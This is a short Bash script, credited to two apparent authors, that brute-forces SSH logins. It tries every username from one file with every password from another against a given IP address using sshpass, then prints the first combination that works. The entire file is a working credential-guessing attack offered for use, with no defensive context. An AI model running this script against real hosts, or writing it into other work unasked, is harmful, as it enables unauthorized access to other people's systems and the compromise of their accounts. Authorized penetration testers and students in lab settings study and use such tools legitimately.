#!/bin/bash

# This Bash Script takes 3 arguments
# $1 - Usernames file
# $2 - Passwords file
# $3 - IP Address of target device


RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

function lineCount()
{
	local lc=$(wc -l $1 | cut -d ' ' -f1)
	echo $lc
}


if [ $# -lt 3 ] || [ $# -gt 3 ]
then
	echo -e "SSH Brute Force Script Usage:"
	echo -e "- Written by Evan and Richard"
	echo -e "- Example: arg1=usernames.txt, args2=passwords.txt, args3=ip"
	exit 1
else

	if [ -f $1 ] && [ -f $2 ]
	then	
		# display line count of each file

		password_line_count=$(lineCount $2)
		username_line_count=$(lineCount $1)
		combos=$(( password_line_count*username_line_count ))

		echo -e "$1 line count: $username_line_count"
 		echo -e "$2 line count: $password_line_count"

		echo -e ""

		# read usernames file
		while IFS='' read -r username
		do
			# read passwords file
			while IFS='' read -r password
			do
				echo -e "Checking $username:$password ..."
				sshpass -p $password ssh $username@$3 'exit'
				if [ $? -eq 0 ]
				then
					echo -e "\t${GREEN}Username\\Password Combo FOUND!${NC}"
					echo -e "\t${GREEN}Username: $username${NC}"
					echo -e "\t${GREEN}Password: $password${NC}"
					exit 0
				else
					echo -e "\t${RED}Failed, trying next combo...${NC}"
				fi				
				echo -e "Combos left: $combos"
				echo -e ""
				(( combos-- ))
			done < $2
		done < $1

		echo -e "Out of Username and Password combos..."
		echo -e "Exiting..."
		exit 3
	else
		echo -e "One of the files passed does not exist."
		echo -e "Exiting..."
		exit 2
	fi
	
fi
